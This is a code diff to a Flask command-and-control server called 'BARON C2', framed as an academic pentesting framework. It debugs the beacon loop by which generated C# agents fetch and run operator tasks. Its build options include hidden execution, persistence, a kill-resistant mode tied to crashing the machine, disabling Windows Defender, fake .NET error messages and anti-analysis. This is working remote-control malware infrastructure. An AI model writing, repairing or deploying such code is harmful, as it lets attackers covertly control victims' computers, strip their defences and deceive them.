@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+﻿#!/usr/bin/env python3
 """
 BARON C2 v4.0 — Full Server
 Academic Pentesting Framework
@@ -544,6 +544,7 @@ guard = SecurityGuard()
 app = Flask(__name__, static_folder=None)
 app.config['SECRET_KEY'] = Config.SECRET_KEY
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
+app.json.compact = True  # CRITICAL: removes spaces in JSON output so C# agent parser works
 
 socketio = SocketIO(
     app,
@@ -1118,6 +1119,8 @@ def agent_beacon():
         clients[cid]['online'] = True
         clients[cid]['ip'] = ip
         state.set('clients', clients)
+    else:
+        return jsonify({'t': []}), 404
 
     # Get pending tasks
     tasks = state.get('tasks') or {}
@@ -1127,6 +1130,7 @@ def agent_beacon():
     if pending:
         tasks[cid] = []
         state.set('tasks', tasks)
+        logger.info(f"Delivered {len(pending)} task(s) to {cid[:8]}")
 
     return jsonify({'t': pending})
 
@@ -1269,11 +1273,11 @@ def panel_build():
         'beacon': int(data.get('beacon_interval', data.get('beacon', 5000))),
         'hidden': data.get('hidden', True),
         'persistence': data.get('persistence', data.get('persist', False)),
-        'anti_kill': data.get('anti_kill', False),
-        'disable_defender': data.get('disable_defender', False),
+        'anti_kill': data.get('anti_kill', data.get('bsod', False)),
+        'disable_defender': data.get('disable_defender', data.get('defender', False)),
         'fake_error': data.get('fake_error', False),
         'fake_error_msg': data.get('fake_error_msg', 'This application requires .NET 6.0'),
-        'anti_analysis': data.get('anti_analysis', False),
+        'anti_analysis': data.get('anti_analysis', data.get('anti', False)),
         'debug': data.get('debug', False),
     }
 
@@ -1724,6 +1728,29 @@ def generate_agent_source(bc):
         '            } catch (Exception ex) { Log("POST ERROR (" + url + "): " + ex.Message); return "{}"; }\n'
         "        }\n"
         "\n"
+        "        static void Beacon() {\n"
+        "            try {\n"
+        '                Log("Sending beacon...");\n'
+        '                string json = string.Format("{{\\\"id\\\":\\\"{0}\\\"}}", Esc(_clientId));\n'
+        '                string resp = Post(_server + "/api/agent/beacon", json);\n'
+        "\n"
+        "                // Normalize whitespace for reliable JSON parsing\n"
+        '                string norm = resp.Replace(" ", "").Replace("\\t", "").Replace("\\r", "").Replace("\\n", "");\n'
+        "\n"
+        '                if (norm.Contains("\\\"t\\\":[{")) {\n'
+        '                    Log("Found tasks in beacon response");\n'
+        '                    int start = norm.IndexOf("\\\"t\\\":[") + 4;\n'
+        "                    int end = norm.LastIndexOf(']') + 1;\n"
+        "                    string tasksStr = norm.Substring(start, end - start);\n"
+        "                    var tasks = ParseTaskArray(tasksStr);\n"
+        "                    foreach (var task in tasks) {\n"
+        '                        Log("Handling task: " + (task.ContainsKey("action") ? task["action"] : "?"));\n'
+        '                        try { HandleTask(task); } catch (Exception tx) { Log("Task Error: " + tx.Message); }\n'
+        "                    }\n"
+        "                }\n"
+        '            } catch (Exception ex) { Log("Beacon Exception: " + ex.Message); }\n'
+        "        }\n"
+        "\n"
         "        static void Register() {\n"
         "            try {\n"
         '                Log("Registering agent...");\n'
@@ -1774,26 +1801,6 @@ def generate_agent_source(bc):
         "                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(s));\n"
         '                return BitConverter.ToString(hash).Replace("-", "").ToLower().Substring(0, 32);\n'
         "            }\n"
-        "        }\n"
-        "\n"
-        "        static void Beacon() {\n"
-        "            try {\n"
-        '                Log("Sending beacon...");\n'
-        '                string json = string.Format("{{\\\"id\\\":\\\"{0}\\\"}}", Esc(_clientId));\n'
-        '                string resp = Post(_server + "/api/agent/beacon", json);\n'
-        "\n"
-        '                if (resp.Contains("\\"t\\":[")) {\n'
-        '                    Log("Found tasks in beacon response");\n'
-        '                    int start = resp.IndexOf("\\"t\\":[") + 4;\n'
-        "                    int end = resp.LastIndexOf(']') + 1;\n"
-        "                    string tasksStr = resp.Substring(start, end - start);\n"
-        "                    var tasks = ParseTaskArray(tasksStr);\n"
-        "                    foreach (var task in tasks) {\n"
-        '                        Log("Handling task...");\n'
-        "                        try { HandleTask(task); } catch (Exception tx) { Log(\"Task Handle Error: \" + tx.Message); }\n"
-        "                    }\n"
-        "                }\n"
-        '            } catch (Exception ex) { Log("Beacon Exception: " + ex.Message); }\n'
         "        }\n"
         "\n"
         "        static List<Dictionary<string, string>> ParseTaskArray(string json) {\n"
@@ -3447,10 +3454,10 @@ def ws_disconnect():
 # ══════════════════════════════════════════════════════════════
 
 def background_cleanup():
-    """Periodic cleanup of expired data"""
+    """Periodic cleanup of expired data + broadcast client status"""
     while True:
         try:
-            time.sleep(60)
+            time.sleep(15)  # Run every 15s for responsive offline detection
 
             now = time.time()
 
@@ -3477,12 +3484,21 @@ def background_cleanup():
             nonces = [n for n in nonces if now - n.get('time', 0) < Config.NONCE_WINDOW]
             state.set('nonces', nonces)
 
-            # Mark offline clients
+            # Mark offline clients & broadcast update
             clients = state.get('clients') or {}
+            changed = False
             for cid, c in clients.items():
-                if now - c.get('last_seen', 0) > Config.CLIENT_TIMEOUT:
+                was_online = c.get('online', False)
+                is_stale = now - c.get('last_seen', 0) > 30  # 30s timeout
+                if is_stale and was_online:
                     c['online'] = False
-            state.set('clients', clients)
+                    changed = True
+                    logger.info(f"Client {cid[:8]} marked OFFLINE (no beacon for {int(now - c.get('last_seen', 0))}s)")
+            if changed:
+                state.set('clients', clients)
+
+            # Always broadcast fresh client data to panel
+            socketio.emit('clients_update', clients, room='panel')
 
             # Clean expired sessions
             sessions = state.get('sessions') or {}
